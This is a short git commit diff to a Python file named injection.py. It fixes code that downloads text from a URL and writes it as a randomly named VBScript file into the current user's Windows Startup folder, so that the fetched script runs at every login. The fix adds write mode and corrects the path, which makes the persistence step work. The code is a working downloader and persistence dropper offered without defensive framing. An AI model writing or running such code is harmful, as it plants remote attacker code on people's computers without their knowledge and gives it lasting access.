754261b3a89da0acc6d1eef1d4e5f02c61f71558
lhaken <56554206+lhaken@users.noreply.github.com>
2021-05-15 16:04:09 +0200

    Add files via upload

--- injection.py
+++ injection.py
@@ -7,5 +7,5 @@ r = requests.get(url)
 t = r.text
 username = os.getlogin()
 
-with open("C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/WQHPWNHW.vbs") as file:
+with open("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WQHPWNHW.vbs", "w") as file:
     file.write(t)
